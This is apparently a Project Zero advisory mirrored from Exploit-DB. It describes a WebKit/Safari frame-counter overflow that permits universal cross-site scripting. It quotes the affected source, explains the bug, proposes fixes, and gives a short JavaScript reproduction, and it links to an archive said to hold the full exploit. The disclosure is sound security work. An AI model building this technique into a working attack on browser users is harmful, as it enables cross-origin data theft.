@@ -1,0 +1,128 @@
+VULNERABILITY DETAILS
+HTMLFrameElementBase.cpp:
+```
+bool HTMLFrameElementBase::isURLAllowed() const
+{
+    if (m_URL.isEmpty()) // ***4***
+        return true;
+
+    return isURLAllowed(document().completeURL(m_URL));
+}
+
+bool HTMLFrameElementBase::isURLAllowed(const URL& completeURL) const
+{
+    if (document().page() && document().page()->subframeCount() >= Page::maxNumberOfFrames) // ***3***
+        return false;
+
+    if (completeURL.isEmpty())
+        return true;
+
+    if (WTF::protocolIsJavaScript(completeURL)) {
+        RefPtr<Document> contentDoc = this->contentDocument();
+        if (contentDoc && !ScriptController::canAccessFromCurrentOrigin(contentDoc->frame(), document()))
+            return false;
+    }
+
+    RefPtr<Frame> parentFrame = document().frame();
+    if (parentFrame)
+        return parentFrame->isURLAllowed(completeURL);
+
+    return true;
+}
+
+void HTMLFrameElementBase::openURL(LockHistory lockHistory, LockBackForwardList lockBackForwardList)
+{
+    if (!isURLAllowed())
+        return;
+
+[...]
+
+    parentFrame->loader().subframeLoader().requestFrame(*this, m_URL, frameName, lockHistory, lockBackForwardList);
+```
+
+NodeRarData.h:
+```
+class NodeRareData : public NodeRareDataBase {
+[...]
+private:
+    unsigned m_connectedFrameCount : 10; // Must fit Page::maxNumberOfFrames. ***1***
+```
+
+Page.h:
+```
+class Page : public Supplementable<Page>, public CanMakeWeakPtr<Page> {
+[...]
+    // Don't allow more than a certain number of frames in a page.
+    // This seems like a reasonable upper bound, and otherwise mutually
+    // recursive frameset pages can quickly bring the program to its knees
+    // with exponential growth in the number of frames.
+    static const int maxNumberOfFrames = 1000; // ***2***
+```
+
+Every DOM node stores the number of child frames currently attached to the subtree to speed up the
+`disconnectSubframes` algorithm; more specifically, when the number of connected frames for a given
+node is zero, its subtree won't be traversed. The value is stored as a 10-bit integer[1], so, to
+protect it from overflowing, an upper bound for the total count of attached subframes has been
+introduced[2]. It's enforced inside `isURLAllowed`[3] along with some other URL-specific checks. The
+problem is if the current URL is empty, all the checks will be skipped[4].
+
+Therefore, an attacker can insert exactly 1024 frame elements with an empty URL into a node, so its
+connected subframe counter will overflow and become zero. Later, when the node is removed from the
+document tree, the subframes won't be detached.
+
+The attacker can also abuse the flaw to make a subframe "survive" a cross-origin page load because
+`disconnectDescendantFrames`, which is called during the document replacement, only processes   
+`iframe` elements inside the document tree. Then, if the subframe is navigated to the `about:srcdoc`
+URL, the new document will inherit the security context from its parent document, which can be an
+arbitrary cross-origin page, while the contents will be attacker-controlled.
+
+Moving the check closer to the actual frame creation in `SubframeLoader::loadSubframe` should fix
+the issue. Besides, since the `srcdoc` technique can be reused in other UXSS bugs, I think it's
+reasonable to try to break it. One way to achieve that is to replace the
+`disconnectDescendantFrames` call in `Document::prepareForDestruction` with a call to
+`FrameLoader::detachChildren`, which detaches subframes regardless of whether their associated
+elements are attached to the document tree. However, I'm not sure if this change would be safe. The
+attached patch just adds a release assertion after `disconnectDescendantFrames` to ensure that all
+subframes have been detached. The solution is not too elegant, but a similar fix in Blink
+(https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/dom/document.cc?rcl=a34380189132e826108a71d9f6024b863ce1dcaf&l=3115)
+has proved to be effective.
+
+
+VERSION
+WebKit revision 247430 
+Safari version 12.1.1 (14607.2.6.1.1)
+
+
+REPRODUCTION CASE
+The minimal test case that demonstrates the issue is as follows:
+```
+<body>
+<script>
+const FRAME_COUNT = 1024;
+
+let container = document.body.appendChild(document.createElement('div'));
+for (let i = 0; i < FRAME_COUNT; ++i) {
+  let frame = container.appendChild(document.createElement('iframe'));
+  frame.style.display = 'none';
+}
+container.remove();
+
+frame = container.firstChild;
+alert(`
+  <iframe> is not attached to the document tree, but still has a content frame!
+  frame.parentNode.parentNode: ${frame.parentNode.parentNode}
+  frame.contentWindow: ${frame.contentWindow}
+`);
+</script>
+</body>
+```
+
+The full UXSS exploit is in the attached archive.
+
+
+CREDIT INFORMATION
+Sergei Glazunov of Google Project Zero
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47552.zip
